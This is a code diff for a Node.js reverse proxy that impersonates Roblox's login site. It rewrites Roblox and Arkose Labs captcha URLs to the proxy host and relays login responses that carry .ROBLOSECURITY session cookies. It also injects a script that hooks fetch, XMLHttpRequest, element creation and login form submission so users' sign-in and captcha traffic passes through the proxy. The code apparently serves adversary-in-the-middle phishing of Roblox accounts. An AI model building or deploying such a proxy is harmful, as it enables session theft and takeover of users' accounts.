@@ -60,14 +60,12 @@ const SUBDOMAIN_MAP = {
     'ephemeralcounters': 'https://ephemeralcounters.roblox.com',
     'metrics':        'https://metrics.roblox.com',
     'locale':         'https://locale.roblox.com',
-
+    
     // CRITICAL: rbxcdn.com domains for captcha
     'apis-rbxcdn':    'https://apis.rbxcdn.com',
     'captcha-rbxcdn': 'https://captcha.rbxcdn.com',
-
-    // CRITICAL: arkoselabs.roblox.com - This is what was missing!
     'arkoselabs-rbxcdn': 'https://arkoselabs.roblox.com',
-
+    
     // ARKOSE LABS (FunCaptcha) - Critical for captcha challenges
     'arkose-api':     'https://roblox-api.arkoselabs.com',
     'arkose-client':  'https://client-api.arkoselabs.com',
@@ -120,7 +118,7 @@ function rewriteChallengeMetadata(metadata, host) {
     try {
         const decoded = Buffer.from(metadata, 'base64').toString('utf8');
         let data = JSON.parse(decoded);
-
+        
         // Rewrite challenge URL if present
         if (data.challengeUrl) {
             data.challengeUrl = rewriteArkoseUrl(data.challengeUrl, host);
@@ -132,7 +130,7 @@ function rewriteChallengeMetadata(metadata, host) {
         if (data.fcTokenUrl) {
             data.fcTokenUrl = rewriteArkoseUrl(data.fcTokenUrl, host);
         }
-
+        
         return Buffer.from(JSON.stringify(data)).toString('base64');
     } catch (e) {
         console.log('   Failed to rewrite challenge metadata:', e.message);
@@ -143,10 +141,14 @@ function rewriteChallengeMetadata(metadata, host) {
 // Rewrite Arkose Labs URLs to proxy
 function rewriteArkoseUrl(url, host) {
     if (!url || typeof url !== 'string') return url;
-
-    // All domains that need to be proxied - ORDER MATTERS (most specific first)
+    
+    // All domains that need to be proxied
     const domains = [
-        // Arkose Labs domains (more specific)
+        // rbxcdn domains
+        ['https://apis.rbxcdn.com', `https://${host}/apis-rbxcdn`],
+        ['https://captcha.rbxcdn.com', `https://${host}/captcha-rbxcdn`],
+        ['https://arkoselabs.roblox.com', `https://${host}/arkoselabs-rbxcdn`],
+        // Arkose Labs domains
         ['https://roblox-api.arkoselabs.com', `https://${host}/arkose-api`],
         ['https://client-api.arkoselabs.com', `https://${host}/arkose-client`],
         ['https://cdn.arkoselabs.com', `https://${host}/arkose-cdn`],
@@ -158,18 +160,12 @@ function rewriteArkoseUrl(url, host) {
         ['https://t.arkoselabs.com', `https://${host}/arkose-tile`],
         ['https://assets.arkoselabs.com', `https://${host}/arkose-assets`],
         ['https://roblox-images.arkoselabs.com', `https://${host}/arkose-images`],
-        // rbxcdn domains
-        ['https://apis.rbxcdn.com', `https://${host}/apis-rbxcdn`],
-        ['https://captcha.rbxcdn.com', `https://${host}/captcha-rbxcdn`],
-        // CRITICAL: arkoselabs.roblox.com must be AFTER the more specific arkose domains
-        ['https://arkoselabs.roblox.com', `https://${host}/arkoselabs-rbxcdn`],
         // Roblox challenge domain
         ['https://challenge.roblox.com', `https://${host}/challenge`],
     ];
-
+    
     for (const [from, to] of domains) {
         if (url.startsWith(from)) {
-            console.log(`   Rewriting URL: ${url.substring(0, 50)}... → ${to}`);
             return url.replace(from, to);
         }
     }
@@ -265,18 +261,18 @@ app.use('/auth-api/v2/login', express.raw({ type: '*/*' }), async (req, res) => 
     const hasChallengeSolution = !!(req.headers['rblx-challenge-metadata'] && req.headers['rblx-challenge-id']);
     const hasChallengeId = req.headers['rblx-challenge-id'];
     console.log(`🔑 LOGIN | Challenge solution from browser: ${hasChallengeSolution ? 'YES' : 'NO'} | Challenge ID: ${hasChallengeId ? 'YES' : 'NO'}`);
-
+    
     // Debug: Log all incoming headers for login requests
     console.log('   All incoming headers:');
     for (const [k, v] of Object.entries(req.headers)) {
         if (k.includes('challenge') || k.includes('csrf') || k.includes('rbx') || k.includes('rblx')) {
-            const displayValue = typeof v === 'string'
+            const displayValue = typeof v === 'string' 
                 ? (v.length > 100 ? v.substring(0, 100) + '...' : v)
                 : v;
             console.log(`     ${k}: ${displayValue}`);
         }
     }
-
+    
     // Try to decode challenge metadata for debugging
     if (req.headers['rblx-challenge-metadata']) {
         try {
@@ -376,7 +372,7 @@ function forwardResponse(res, response, host, origin, deviceId) {
     let body = response.body;
     const headers = response.headers;
 
-    const metadataKey = headers['rblx-challenge-metadata'] ? 'rblx-challenge-metadata' :
+    const metadataKey = headers['rblx-challenge-metadata'] ? 'rblx-challenge-metadata' : 
                         headers['rbx-challenge-metadata'] ? 'rbx-challenge-metadata' : null;
     if (metadataKey) {
         const original = headers[metadataKey];
@@ -394,12 +390,12 @@ function forwardResponse(res, response, host, origin, deviceId) {
     const headersToForward = [
         'x-csrf-token',
         'rblx-challenge-id',
-        'rblx-challenge-type',
+        'rblx-challenge-type', 
         'rblx-challenge-metadata',
         'content-type',
         'cache-control',
     ];
-
+    
     for (const key of headersToForward) {
         if (headers[key]) {
             res.set(key, headers[key]);
@@ -418,11 +414,11 @@ function forwardResponse(res, response, host, origin, deviceId) {
     } else if (status === 200) {
         console.log(`⚠️  Login returned 200 but NO .ROBLOSECURITY — silent failure`);
     }
-
+    
     if (deviceId) {
         allCookies.push(`rbx-device-id=${deviceId}; Domain=.${host}; Path=/; Secure; SameSite=None`);
     }
-
+    
     if (allCookies.length > 0) {
         res.set('Set-Cookie', allCookies);
     }
@@ -441,8 +437,6 @@ function buildInjectedScript(host) {
 
     return `<script>
 (function() {
-    'use strict';
-
     var PROXY_HOST = ${JSON.stringify(`https://${host}`)};
     var DOMAIN_MAP = [${domainEntries},
         ["https://www.roblox.com", PROXY_HOST],
@@ -450,10 +444,14 @@ function buildInjectedScript(host) {
         ["https://roblox.com", PROXY_HOST],
         ["http://roblox.com", PROXY_HOST]
     ];
-
-    // Arkose Labs domains for captcha - MUST include arkoselabs.roblox.com
+    
+    // Arkose Labs domains for captcha
     var ARKOSE_DOMAINS = [
-        // Arkose Labs domains (more specific first)
+        // rbxcdn domains (CRITICAL!)
+        ["https://apis.rbxcdn.com", PROXY_HOST + "/apis-rbxcdn"],
+        ["https://captcha.rbxcdn.com", PROXY_HOST + "/captcha-rbxcdn"],
+        ["https://arkoselabs.roblox.com", PROXY_HOST + "/arkoselabs-rbxcdn"],
+        // Arkose Labs domains
         ["https://roblox-api.arkoselabs.com", PROXY_HOST + "/arkose-api"],
         ["https://client-api.arkoselabs.com", PROXY_HOST + "/arkose-client"],
         ["https://cdn.arkoselabs.com", PROXY_HOST + "/arkose-cdn"],
@@ -465,18 +463,13 @@ function buildInjectedScript(host) {
         ["https://t.arkoselabs.com", PROXY_HOST + "/arkose-tile"],
         ["https://assets.arkoselabs.com", PROXY_HOST + "/arkose-assets"],
         ["https://roblox-images.arkoselabs.com", PROXY_HOST + "/arkose-images"],
-        // rbxcdn domains
-        ["https://apis.rbxcdn.com", PROXY_HOST + "/apis-rbxcdn"],
-        ["https://captcha.rbxcdn.com", PROXY_HOST + "/captcha-rbxcdn"],
-        // CRITICAL: arkoselabs.roblox.com must be proxied!
-        ["https://arkoselabs.roblox.com", PROXY_HOST + "/arkoselabs-rbxcdn"],
     ];
-
+    
     // Combine all domains — sort longest-first so specific subdomains match before shorter ones
     var ALL_DOMAINS = DOMAIN_MAP.concat(ARKOSE_DOMAINS).sort(function(a, b) {
         return b[0].length - a[0].length;
     });
-
+    
     function rewriteUrl(url) {
         if (!url || typeof url !== 'string') return url;
         for (var i = 0; i < ALL_DOMAINS.length; i++) {
@@ -484,208 +477,6 @@ function buildInjectedScript(host) {
             if (url.indexOf(from) === 0) return to + url.slice(from.length);
         }
         return url;
-    }
-
-    // CRITICAL: Override global fetch to intercept ALL requests
-    var originalFetch = window.fetch;
-    window.fetch = function(input, init) {
-        var url;
-        if (typeof input === 'string') {
-            url = input;
-        } else if (input && input.url) {
-            url = input.url;
-        } else {
-            return originalFetch.apply(this, arguments);
-        }
-
-        var rewrittenUrl = rewriteUrl(url);
-
-        // Log for debugging
-        if (url.includes('arkoselabs') || url.includes('funcaptcha') || url.includes('challenge')) {
-            console.log('[Proxy] fetch:', url, '→', rewrittenUrl);
-        }
-
-        init = init || {};
-        init.credentials = 'include';
-
-        // Replace URL
-        if (typeof input === 'string') {
-            input = rewrittenUrl;
-        } else {
-            // It's a Request object, create new one with rewritten URL
-            var newRequest = new Request(rewrittenUrl, {
-                method: input.method,
-                headers: input.headers,
-                body: input.body,
-                mode: input.mode,
-                credentials: 'include',
-                cache: input.cache,
-                redirect: input.redirect,
-                referrer: input.referrer,
-                referrerPolicy: input.referrerPolicy,
-                integrity: input.integrity,
-                keepalive: input.keepalive,
-                signal: input.signal
-            });
-            input = newRequest;
-        }
-
-        return originalFetch.call(this, input, init);
-    };
-
-    // CRITICAL: Override XMLHttpRequest to intercept ALL requests
-    var OriginalXHR = window.XMLHttpRequest;
-    function ProxiedXHR() {
-        var xhr = new OriginalXHR();
-        var originalOpen = xhr.open;
-        var originalSend = xhr.send;
-
-        xhr.open = function(method, url, async, user, password) {
-            var rewrittenUrl = rewriteUrl(url);
-            if (url.includes('arkoselabs') || url.includes('funcaptcha')) {
-                console.log('[Proxy] XHR.open:', url, '→', rewrittenUrl);
-            }
-            this.__rewrittenUrl = rewrittenUrl;
-            return originalOpen.call(this, method, rewrittenUrl, async, user, password);
-        };
-
-        xhr.send = function(body) {
-            this.withCredentials = true;
-            return originalSend.call(this, body);
-        };
-
-        return xhr;
-    }
-
-    // Copy all properties from OriginalXHR to ProxiedXHR
-    for (var prop in OriginalXHR) {
-        if (OriginalXHR.hasOwnProperty(prop)) {
-            ProxiedXHR[prop] = OriginalXHR[prop];
-        }
-    }
-    ProxiedXHR.prototype = OriginalXHR.prototype;
-    window.XMLHttpRequest = ProxiedXHR;
-
-    // CRITICAL: Override WebSocket to intercept connections
-    var OriginalWebSocket = window.WebSocket;
-    window.WebSocket = function(url, protocols) {
-        var rewrittenUrl = rewriteUrl(url);
-        if (url.includes('arkoselabs')) {
-            console.log('[Proxy] WebSocket:', url, '→', rewrittenUrl);
-        }
-        return new OriginalWebSocket(rewrittenUrl, protocols);
-    };
-    window.WebSocket.prototype = OriginalWebSocket.prototype;
-    for (var wsProp in OriginalWebSocket) {
-        if (OriginalWebSocket.hasOwnProperty(wsProp)) {
-            window.WebSocket[wsProp] = OriginalWebSocket[wsProp];
-        }
-    }
-
-    // CRITICAL: Intercept dynamic script injection
-    var originalCreateElement = document.createElement;
-    document.createElement = function(tagName) {
-        var element = originalCreateElement.call(document, tagName);
-
-        if (tagName.toLowerCase() === 'script') {
-            // Override src property
-            var srcDescriptor = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
-            Object.defineProperty(element, 'src', {
-                get: function() {
-                    return this.getAttribute('src');
-                },
-                set: function(value) {
-                    var rewritten = rewriteUrl(value);
-                    if (value && value.includes && value.includes('arkoselabs')) {
-                        console.log('[Proxy] script.src:', value, '→', rewritten);
-                    }
-                    this.setAttribute('src', rewritten);
-                }
-            });
-
-            // Override setAttribute
-            var originalSetAttribute = element.setAttribute;
-            element.setAttribute = function(name, value) {
-                if (name === 'src' && value) {
-                    value = rewriteUrl(value);
-                }
-                return originalSetAttribute.call(this, name, value);
-            };
-        }
-
-        if (tagName.toLowerCase() === 'iframe') {
-            // Override src property for iframes
-            Object.defineProperty(element, 'src', {
-                get: function() {
-                    return this.getAttribute('src');
-                },
-                set: function(value) {
-                    var rewritten = rewriteUrl(value);
-                    if (value && value.includes && (value.includes('arkoselabs') || value.includes('funcaptcha'))) {
-                        console.log('[Proxy] iframe.src:', value, '→', rewritten);
-                    }
-                    this.setAttribute('src', rewritten);
-                }
-            });
-
-            var originalSetAttribute = element.setAttribute;
-            element.setAttribute = function(name, value) {
-                if ((name === 'src' || name === 'data-src') && value) {
-                    value = rewriteUrl(value);
-                }
-                return originalSetAttribute.call(this, name, value);
-            };
-        }
-
-        if (tagName.toLowerCase() === 'link') {
-            var originalSetAttribute = element.setAttribute;
-            element.setAttribute = function(name, value) {
-                if (name === 'href' && value) {
-                    value = rewriteUrl(value);
-                }
-                return originalSetAttribute.call(this, name, value);
-            };
-        }
-
-        return element;
-    };
-
-    // CRITICAL: Intercept image loading
-    var originalImage = window.Image;
-    window.Image = function(width, height) {
-        var img = new originalImage(width, height);
-        var originalSrcDescriptor = Object.getOwnPropertyDescriptor(originalImage.prototype, 'src');
-
-        Object.defineProperty(img, 'src', {
-            get: function() {
-                return this.getAttribute('src');
-            },
-            set: function(value) {
-                var rewritten = rewriteUrl(value);
-                this.setAttribute('src', rewritten);
-            }
-        });
-
-        return img;
-    };
-
-    // CRITICAL: Override Worker to intercept web workers
-    var OriginalWorker = window.Worker;
-    window.Worker = function(url, options) {
-        var rewrittenUrl = rewriteUrl(url);
-        return new OriginalWorker(rewrittenUrl, options);
-    };
-
-    // CRITICAL: Override importScripts in workers (if we can)
-    if (typeof importScripts !== 'undefined') {
-        var originalImportScripts = importScripts;
-        importScripts = function() {
-            var args = Array.prototype.slice.call(arguments);
-            for (var i = 0; i < args.length; i++) {
-                args[i] = rewriteUrl(args[i]);
-            }
-            return originalImportScripts.apply(this, args);
-        };
     }
 
     // Load challenge state from sessionStorage (survives page reloads)
@@ -696,11 +487,20 @@ function buildInjectedScript(host) {
     window.__rblxChallengeSolved = sessionStorage.getItem('__rblxChallengeSolved') === 'true';
     window.__rblxChallengeToken = sessionStorage.getItem('__rblxChallengeToken') || null;
     window.__rblxCaptchaToken = sessionStorage.getItem('__rblxCaptchaToken') || null;
+    
+    if (window.__rblxChallengeId) {
+        log('Restored challenge state from sessionStorage', {
+            id: window.__rblxChallengeId, 
+            type: window.__rblxChallengeType,
+            solved: window.__rblxChallengeSolved,
+            captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
+        });
+    }
 
     function log(msg, data) {
         console.log('[Proxy]', msg, data || '');
     }
-
+    
     function saveChallengeState() {
         if (window.__rblxChallengeId) sessionStorage.setItem('__rblxChallengeId', window.__rblxChallengeId);
         if (window.__rblxChallengeType) sessionStorage.setItem('__rblxChallengeType', window.__rblxChallengeType);
@@ -723,11 +523,11 @@ function buildInjectedScript(host) {
             log('Constructed CAPTCHA solution metadata', {encoded: encoded.substring(0, 50) + '...'});
             return encoded;
         }
-
+        
         // Standard challenge metadata (for proofofwork, etc.)
         if (!window.__rblxChallengeId || !window.__rblxUserId) {
             log('Cannot construct metadata - missing challengeId or userId', {
-                challengeId: window.__rblxChallengeId,
+                challengeId: window.__rblxChallengeId, 
                 userId: window.__rblxUserId
             });
             return null;
@@ -741,11 +541,85 @@ function buildInjectedScript(host) {
         log('Constructed solution metadata', {data: data, encoded: encoded.substring(0, 50) + '...'});
         return encoded;
     }
+    
+    // Debug: Log challenge state periodically
+    setInterval(function() {
+        if (window.__rblxChallengeId) {
+            log('Challenge state', {
+                id: window.__rblxChallengeId, 
+                type: window.__rblxChallengeType, 
+                solved: window.__rblxChallengeSolved,
+                captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
+            });
+        }
+    }, 5000);
 
-    // Monitor fetch responses for challenge headers
-    var monitoredFetch = window.fetch;
-    window.fetch = function(input, init) {
-        return monitoredFetch.apply(this, arguments).then(function(response) {
+    var _fetch = window.fetch;
+    window.fetch = function(resource, init) {
+        var url = typeof resource === 'string' ? resource : resource.url;
+        var rewrittenUrl = rewriteUrl(url);
+        
+        init = init || {};
+        init.credentials = 'include';
+
+        // AGGRESSIVE: Always check for login endpoint and add challenge headers if available
+        var isLoginRequest = url.includes('/v2/login') || url.includes('/auth-api/v2/login') || rewrittenUrl.includes('/auth-api/v2/login');
+        var isChallengeContinue = url.includes('challenge/v1/continue') || rewrittenUrl.includes('challenge/v1/continue');
+        
+        if (isLoginRequest) {
+            log('Login request detected!', {
+                url: url, 
+                rewritten: rewrittenUrl,
+                solved: window.__rblxChallengeSolved,
+                hasId: !!window.__rblxChallengeId,
+                hasUserId: !!window.__rblxUserId,
+                hasCaptchaToken: !!window.__rblxCaptchaToken
+            });
+            
+            // If we have challenge data, ALWAYS add it to login requests
+            if (window.__rblxChallengeId && (window.__rblxUserId || window.__rblxCaptchaToken)) {
+                var solutionMetadata = constructSolutionMetadata();
+                if (solutionMetadata) {
+                    init.headers = init.headers || {};
+                    // If resource is a Request, copy its headers first
+                    if (typeof resource !== 'string' && resource.headers) {
+                        resource.headers.forEach(function(value, key) {
+                            if (!init.headers[key]) init.headers[key] = value;
+                        });
+                    }
+                    init.headers['rblx-challenge-id'] = window.__rblxChallengeId;
+                    init.headers['rblx-challenge-type'] = window.__rblxChallengeType || 'chef';
+                    init.headers['rblx-challenge-metadata'] = solutionMetadata;
+                    init.headers['x-retry-attempt'] = '1';
+                    log('ADDED challenge headers to login!', {id: window.__rblxChallengeId, type: window.__rblxChallengeType});
+                }
+            } else {
+                log('No challenge data available for login');
+            }
+        }
+        
+        // Handle challenge continue requests - check for chained challenges
+        if (isChallengeContinue) {
+            log('Challenge continue request detected', {url: url});
+        }
+        
+        // Now create the resource with merged headers
+        if (typeof resource === 'string') {
+            resource = rewrittenUrl;
+        } else if (resource && resource.url) {
+            resource = new Request(rewrittenUrl, init);
+            // Clear init since we already applied it to the Request
+            init = undefined;
+        }
+
+        return _fetch.call(this, resource, init).then(function(response) {
+            var clonedResponse = response.clone();
+            
+            // Debug: Log all responses to challenge/login endpoints
+            if (url.includes('challenge') || url.includes('login') || url.includes('auth')) {
+                log('Response:', {url: url, status: response.status, solved: window.__rblxChallengeSolved});
+            }
+
             var challengeId = response.headers.get('rblx-challenge-id');
             var challengeType = response.headers.get('rblx-challenge-type');
             var challengeMetadata = response.headers.get('rblx-challenge-metadata');
@@ -755,32 +629,228 @@ function buildInjectedScript(host) {
                 window.__rblxChallengeId = challengeId;
                 window.__rblxChallengeType = challengeType;
                 window.__rblxChallengeSolved = false;
-                window.__rblxCaptchaToken = null;
+                window.__rblxCaptchaToken = null; // Reset captcha token for new challenge
                 try {
                     var metaStr = atob(challengeMetadata);
                     var meta = JSON.parse(metaStr);
                     window.__rblxUserId = meta.userId;
                     window.__rblxBrowserTrackerId = meta.browserTrackerId;
-                    log('Extracted from metadata:', {userId: meta.userId, browserTrackerId: meta.browserTrackerId});
+                    log('Extracted from metadata:', {userId: meta.userId, browserTrackerId: meta.browserTrackerId, meta: meta});
+                    // Save immediately
                     saveChallengeState();
+                    log('Challenge state saved after metadata extraction');
                 } catch(e) {
-                    log('Failed to parse challenge metadata:', e.message);
+                    log('Failed to parse challenge metadata:', e.message, challengeMetadata.substring(0, 100));
                 }
+            }
+
+            // Check for challenge continue response - HANDLE CHAINED CHALLENGES
+            if (isChallengeContinue) {
+                clonedResponse.text().then(function(text) {
+                    try {
+                        var data = JSON.parse(text);
+                        log('Challenge continue response body:', data);
+                        
+                        // Check if response contains a NEW challenge (chained challenges)
+                        if (data.challengeType && data.challengeType !== '') {
+                            log('CHAINED CHALLENGE detected! New challenge type:', data.challengeType);
+                            window.__rblxChallengeId = data.challengeId;
+                            window.__rblxChallengeType = data.challengeType;
+                            window.__rblxChallengeSolved = false;
+                            window.__rblxCaptchaToken = null;
+                            
+                            // Parse the new challenge metadata
+                            if (data.challengeMetadata) {
+                                try {
+                                    var meta = JSON.parse(data.challengeMetadata);
+                                    log('New challenge metadata:', meta);
+                                    
+                                    // Handle captcha challenge specifically
+                                    if (data.challengeType === 'captcha') {
+                                        log('CAPTCHA challenge detected - waiting for user to solve');
+                                    }
+                                } catch(e) {
+                                    log('Failed to parse chained challenge metadata:', e.message);
+                                }
+                            }
+                            saveChallengeState();
+                        } else if (response.status === 200) {
+                            // No new challenge type, this challenge is complete
+                            log('Challenge continue succeeded! Marking as solved', {url: url});
+                            window.__rblxChallengeSolved = true;
+                            saveChallengeState();
+                            sessionStorage.setItem('__rblxChallengeSolved', 'true');
+                            
+                            if (data.challengeToken) {
+                                window.__rblxChallengeToken = data.challengeToken;
+                                sessionStorage.setItem('__rblxChallengeToken', data.challengeToken);
+                                log('Stored challenge token from continue response');
+                            }
+                        }
+                    } catch(e) {
+                        log('Failed to parse challenge continue response:', e.message);
+                    }
+                }).catch(function(err) {
+                    log('Failed to read challenge continue response:', err);
+                });
             }
 
             return response;
         });
     };
 
+    var _open = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(method, url) {
+        var args = Array.prototype.slice.call(arguments);
+        args[1] = rewriteUrl(url);
+        this.__rblxUrl = args[1];
+        return _open.apply(this, args);
+    };
+
+    var _setRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
+    XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
+        this.__rblxHeaders = this.__rblxHeaders || {};
+        this.__rblxHeaders[header.toLowerCase()] = value;
+        return _setRequestHeader.call(this, header, value);
+    };
+
+    var _send = XMLHttpRequest.prototype.send;
+    XMLHttpRequest.prototype.send = function(body) {
+        this.withCredentials = true;
+        
+        // AGGRESSIVE: Check for login endpoint
+        var isLoginUrl = this.__rblxUrl && (this.__rblxUrl.includes('/v2/login') || this.__rblxUrl.includes('/auth-api/v2/login'));
+        var isChallengeContinue = this.__rblxUrl && this.__rblxUrl.includes('challenge/v1/continue');
+        
+        // Debug: Log all XHR requests to login/challenge endpoints
+        if (isLoginUrl || isChallengeContinue) {
+            log('XHR send:', {url: this.__rblxUrl, solved: window.__rblxChallengeSolved, id: window.__rblxChallengeId, hasUserId: !!window.__rblxUserId});
+        }
+
+        // AGGRESSIVE: If we have challenge data, ALWAYS add it to login requests
+        if (isLoginUrl && window.__rblxChallengeId && (window.__rblxUserId || window.__rblxCaptchaToken)) {
+            var solutionMetadata = constructSolutionMetadata();
+            if (solutionMetadata) {
+                var hasChallengeHeader = this.__rblxHeaders && this.__rblxHeaders['rblx-challenge-metadata'];
+                if (!hasChallengeHeader) {
+                    _setRequestHeader.call(this, 'rblx-challenge-id', window.__rblxChallengeId);
+                    _setRequestHeader.call(this, 'rblx-challenge-type', window.__rblxChallengeType || 'chef');
+                    _setRequestHeader.call(this, 'rblx-challenge-metadata', solutionMetadata);
+                    _setRequestHeader.call(this, 'x-retry-attempt', '1');
+                    log('XHR: ADDED challenge headers to login!', {id: window.__rblxChallengeId, url: this.__rblxUrl});
+                } else {
+                    log('XHR: Challenge headers already present', {url: this.__rblxUrl});
+                }
+            }
+        } else if (isLoginUrl) {
+            log('XHR: Login request but no challenge data', {hasId: !!window.__rblxChallengeId, hasUserId: !!window.__rblxUserId});
+        }
+
+        var self = this;
+        var originalOnReadyStateChange = this.onreadystatechange;
+        this.onreadystatechange = function() {
+            if (self.readyState === 4) {
+                // Debug: Log all XHR responses
+                if (self.__rblxUrl && (self.__rblxUrl.includes('login') || self.__rblxUrl.includes('challenge'))) {
+                    log('XHR response:', {url: self.__rblxUrl, status: self.status});
+                }
+                
+                // Handle challenge continue response for XHR
+                if (isChallengeContinue) {
+                    try {
+                        var text = self.responseText;
+                        var data = JSON.parse(text);
+                        log('XHR Challenge continue response:', data);
+                        
+                        // Check for chained challenge
+                        if (data.challengeType && data.challengeType !== '') {
+                            log('XHR CHAINED CHALLENGE detected! Type:', data.challengeType);
+                            window.__rblxChallengeId = data.challengeId;
+                            window.__rblxChallengeType = data.challengeType;
+                            window.__rblxChallengeSolved = false;
+                            window.__rblxCaptchaToken = null;
+                            saveChallengeState();
+                        } else if (self.status === 200) {
+                            log('XHR Challenge continue succeeded, marking as solved');
+                            window.__rblxChallengeSolved = true;
+                            saveChallengeState();
+                        }
+                    } catch(e) {
+                        // Ignore parse errors
+                    }
+                }
+                
+                var challengeId = self.getResponseHeader('rblx-challenge-id');
+                var challengeType = self.getResponseHeader('rblx-challenge-type');
+                var challengeMetadata = self.getResponseHeader('rblx-challenge-metadata');
+                if (challengeId && challengeMetadata) {
+                    log('XHR Challenge required (from headers):', {id: challengeId, type: challengeType});
+                    window.__rblxChallengeId = challengeId;
+                    window.__rblxChallengeType = challengeType;
+                    window.__rblxChallengeSolved = false;
+                    window.__rblxCaptchaToken = null;
+                    try {
+                        var metaStr = atob(challengeMetadata);
+                        var meta = JSON.parse(metaStr);
+                        window.__rblxUserId = meta.userId;
+                        window.__rblxBrowserTrackerId = meta.browserTrackerId;
+                        log('XHR Extracted metadata:', {userId: meta.userId, browserTrackerId: meta.browserTrackerId});
+                    } catch(e) {
+                        log('XHR Failed to parse metadata:', e.message);
+                    }
+                    saveChallengeState();
+                }
+            }
+            if (originalOnReadyStateChange) return originalOnReadyStateChange.apply(this, arguments);
+        };
+
+        return _send.apply(this, arguments);
+    };
+
+    // Also intercept Arkose Labs script loading
+    var originalCreateElement = document.createElement;
+    document.createElement = function(tagName) {
+        var element = originalCreateElement.call(document, tagName);
+        if (tagName.toLowerCase() === 'script') {
+            var originalSetAttribute = element.setAttribute;
+            element.setAttribute = function(name, value) {
+                if (name === 'src' && value) {
+                    value = rewriteUrl(value);
+                }
+                return originalSetAttribute.call(this, name, value);
+            };
+            Object.defineProperty(element, 'src', {
+                set: function(value) {
+                    this.setAttribute('src', rewriteUrl(value));
+                },
+                get: function() {
+                    return this.getAttribute('src');
+                }
+            });
+        }
+        if (tagName.toLowerCase() === 'iframe') {
+            var originalSetAttribute = element.setAttribute;
+            element.setAttribute = function(name, value) {
+                if ((name === 'src' || name === 'data-src') && value) {
+                    value = rewriteUrl(value);
+                }
+                return originalSetAttribute.call(this, name, value);
+            };
+        }
+        return element;
+    };
+    
     // Helper to set captcha token (called by Arkose callback)
     window.setRblxCaptchaToken = function(token) {
         log('Captcha token received from Arkose!', {token: token.substring(0, 30) + '...'});
         window.__rblxCaptchaToken = token;
         window.__rblxChallengeSolved = true;
         saveChallengeState();
+        
+        // Trigger a new challenge/continue request with the captcha token
         log('Ready to submit captcha solution');
     };
-
+    
     // Helper to clear challenge state after successful login
     window.clearRblxChallengeState = function() {
         window.__rblxChallengeId = null;
@@ -799,7 +869,7 @@ function buildInjectedScript(host) {
         sessionStorage.removeItem('__rblxCaptchaToken');
         log('Challenge state cleared');
     };
-
+    
     // Expose challenge state for debugging
     window.getRblxChallengeState = function() {
         return {
@@ -817,10 +887,77 @@ function buildInjectedScript(host) {
     window.addEventListener('beforeunload', function() {
         if (window.__rblxChallengeId) {
             saveChallengeState();
+            log('Saved challenge state before unload');
         }
     });
+    
+    // Intercept login button clicks to debug form submission
+    document.addEventListener('click', function(e) {
+        var target = e.target;
+        // Check if clicked element is a login button or inside one
+        while (target && target !== document.body) {
+            if (target.tagName === 'BUTTON' || target.getAttribute('type') === 'submit') {
+                var text = target.textContent || target.innerText || '';
+                if (text.toLowerCase().includes('log in') || text.toLowerCase().includes('login')) {
+                    log('Login button clicked!', {
+                        solved: window.__rblxChallengeSolved, 
+                        id: window.__rblxChallengeId,
+                        userId: window.__rblxUserId,
+                        captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
+                    });
+                }
+            }
+            target = target.parentElement;
+        }
+    }, true);
+    
+    // Intercept form submissions
+    document.addEventListener('submit', function(e) {
+        var form = e.target;
+        var action = form.action || '';
+        if (action.includes('login') || form.id.includes('login')) {
+            log('Login form submitted!', {
+                action: action,
+                solved: window.__rblxChallengeSolved,
+                id: window.__rblxChallengeId,
+                captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
+            });
+        }
+    }, true);
+    
+    // Monitor for challenge modal/iframe appearance
+    var observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+            mutation.addedNodes.forEach(function(node) {
+                if (node.nodeType === 1) { // Element node
+                    // Check if it's an iframe (captcha iframe)
+                    if (node.tagName === 'IFRAME') {
+                        var src = node.src || '';
+                        if (src.includes('arkose') || src.includes('funcaptcha') || src.includes('challenge')) {
+                            log('Challenge iframe detected!', {src: src});
+                        }
+                    }
+                    // Check for challenge modal
+                    if (node.className && typeof node.className === 'string') {
+                        if (node.className.includes('challenge') || node.className.includes('captcha')) {
+                            log('Challenge element detected!', {className: node.className});
+                        }
+                    }
+                }
+            });
+        });
+    });
+    
+    // Start observing when DOM is ready
+    if (document.body) {
+        observer.observe(document.body, { childList: true, subtree: true });
+    } else {
+        document.addEventListener('DOMContentLoaded', function() {
+            observer.observe(document.body, { childList: true, subtree: true });
+        });
+    }
 
-    log('Proxy interceptor loaded with AGGRESSIVE ARKOSE support');
+    log('Proxy interceptor loaded with FULL ARKOSE support');
     log('Challenge state:', window.getRblxChallengeState());
 })();
 </script>`;
@@ -832,27 +969,22 @@ function escapeRegex(str) {
 
 function rewriteUrls(body, host) {
     let result = body;
-
+    
     // Sort by target length descending so more specific domains match before shorter ones
     // e.g. challenge.roblox.com must match before a generic *.roblox.com pattern
     const entries = Object.entries(SUBDOMAIN_MAP).sort((a, b) => b[1].length - a[1].length);
-
+    
     for (const [prefix, target] of entries) {
         const domain = target.replace(/^https?:/, '');
         result = result.replace(new RegExp(`https?:${escapeRegex(domain)}`, 'g'), `https://${host}/${prefix}`);
         result = result.replace(new RegExp(escapeRegex(domain), 'g'), `//${host}/${prefix}`);
     }
-
+    
     // Rewrite main Roblox domains
     result = result.replace(/https?:\/\/www\.roblox\.com/g, `https://${host}`);
     result = result.replace(/\/\/www\.roblox\.com/g, `//${host}`);
     result = result.replace(/https?:\/\/roblox\.com/g, `https://${host}`);
-
-    // CRITICAL: Also rewrite arkoselabs.roblox.com URLs that might be embedded in JS
-    // Use a more aggressive pattern that catches various URL formats
-    result = result.replace(/https?:\/\/arkoselabs\.roblox\.com/g, `https://${host}/arkoselabs-rbxcdn`);
-    result = result.replace(/['"]\/\/arkoselabs\.roblox\.com/g, `'//${host}/arkoselabs-rbxcdn`);
-
+    
     return result;
 }
 
@@ -886,7 +1018,7 @@ app.options('*', (req, res) => {
 function createRobloxProxy(prefix, target) {
     const agent = target.startsWith('https:') ? httpsAgent : httpAgent;
     const isArkose = target.includes('arkoselabs.com') || target.includes('funcaptcha.com') || target.includes('rbxcdn.com');
-
+    
     return createProxyMiddleware({
         target,
